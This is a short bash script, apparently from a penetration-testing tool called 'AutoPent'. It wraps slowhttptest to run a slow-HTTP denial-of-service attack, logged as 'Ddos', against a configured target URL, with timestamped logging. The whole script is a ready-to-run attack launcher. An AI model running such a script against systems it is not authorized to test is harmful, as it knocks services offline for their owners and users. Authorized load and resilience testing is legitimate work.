#!/bin/bash

# Load configuration
source config/config.sh

# Log file
#LOGFILE="logs/attack_log.txt" - opsi 1
LOGFILE="logs/attack_log_$(date '+%Y%m%d_%H%M%S').txt" #opsi 2

# Get attacker IP
attacker_ip=$(hostname -I | awk '{print $1}')

# Function to log time
log_time() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a $LOGFILE
}

# Start attack
log_time "Starting AutoPent attack on $target_url..."
log_time "Type-Attack  : \"$test_type\""
log_time "Target       : \"$target_url\""
log_time "From         : \"$attacker_ip\""
log_time "Attack of    : Ddos"

START_TIME=$(date '+%Y-%m-%d %H:%M:%S')
log_time "Time-Start   : \"$START_TIME\""

# Run slowhttptest with additional parameters
slowhttptest -c $connections $test_type -r $request_rate \
    -w $read_timeout -y $write_timeout \
    -n $num_requests -z $header_size \
    -u $target_url -t $http_method \
    -i $interval -x $body_size \
    -p $probe_interval -o $output_prefix \
    $enable_graph -l $attack_duration 2>&1 | awk 'NF' | tee -a $LOGFILE

END_TIME=$(date '+%Y-%m-%d %H:%M:%S')
log_time "Time-End     : \"$END_TIME\""
